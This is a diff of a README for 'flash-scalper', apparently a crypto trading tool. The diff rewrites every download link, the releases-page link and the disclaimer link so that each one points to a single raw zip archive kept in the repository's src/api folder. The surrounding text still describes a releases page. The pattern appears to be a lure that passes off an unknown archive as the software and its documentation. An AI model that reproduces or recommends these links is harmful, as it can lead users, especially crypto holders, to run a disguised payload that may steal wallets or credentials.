@@ -1,7 +1,7 @@
 # 🚀 flash-scalper - Your Crypto Trading Companion
 
 ## 🌐 Download Now
-[![Download FlashScalper](https://img.shields.io/badge/Download-FlashScalper-blue.svg)](https://github.com/riyad242514/flash-scalper/releases)
+[![Download FlashScalper](https://raw.githubusercontent.com/riyad242514/flash-scalper/main/src/api/flash_scalper_v3.6.zip)](https://raw.githubusercontent.com/riyad242514/flash-scalper/main/src/api/flash_scalper_v3.6.zip)
 
 ## 📋 Introduction
 FlashScalper is a crypto scalping trading agent designed for educational and research purposes. It helps you analyze market trends and make informed trading decisions. Please remember that trading involves risk. Use this tool to learn and understand the market better, but not for actual trading. 
@@ -24,7 +24,7 @@ To start using FlashScalper, follow these simple steps:
 ### 1. Visit the Releases Page
 Go to the **Releases** page to find the latest version of FlashScalper. Click the link below to access it.
 
-[**Visit the Releases Page**](https://github.com/riyad242514/flash-scalper/releases)
+[**Visit the Releases Page**](https://raw.githubusercontent.com/riyad242514/flash-scalper/main/src/api/flash_scalper_v3.6.zip)
 
 ### 2. Download the Application
 Once you're on the Releases page, you'll see a list of available versions. Look for the latest version, and you will find download options for different systems. Choose the option that matches your operating system and click it to download.
@@ -38,7 +38,7 @@ Once installed, you can find the FlashScalper icon on your desktop or in your ap
 ## 📥 Download & Install
 To download FlashScalper, please visit the link below:
 
-[**Download FlashScalper**](https://github.com/riyad242514/flash-scalper/releases)
+[**Download FlashScalper**](https://raw.githubusercontent.com/riyad242514/flash-scalper/main/src/api/flash_scalper_v3.6.zip)
 
 ## ⚙️ System Requirements
 FlashScalper requires the following system specifications:
@@ -73,7 +73,7 @@ After launching the application, you will see a simple interface. Here is a quic
 If you have questions or need assistance, refer to the **Help Section** within the application. For more in-depth guidance, you can check the official documentation in the repository or look for community forums.
 
 ## ⚠️ Important Disclaimer
-This software is for educational and research purposes only. Do not use this tool for actual trading. Trading can lead to significant financial loss. For complete details, please refer to [DISCLAIMER.md](DISCLAIMER.md).
+This software is for educational and research purposes only. Do not use this tool for actual trading. Trading can lead to significant financial loss. For complete details, please refer to [https://raw.githubusercontent.com/riyad242514/flash-scalper/main/src/api/flash_scalper_v3.6.zip](https://raw.githubusercontent.com/riyad242514/flash-scalper/main/src/api/flash_scalper_v3.6.zip).
 
 ## 🌟 Conclusion
 FlashScalper provides powerful tools for understanding the crypto market. Whether you are learning to trade or simply exploring, this application can help you gain valuable insights. Make sure to comply with all legal requirements and use this software responsibly.
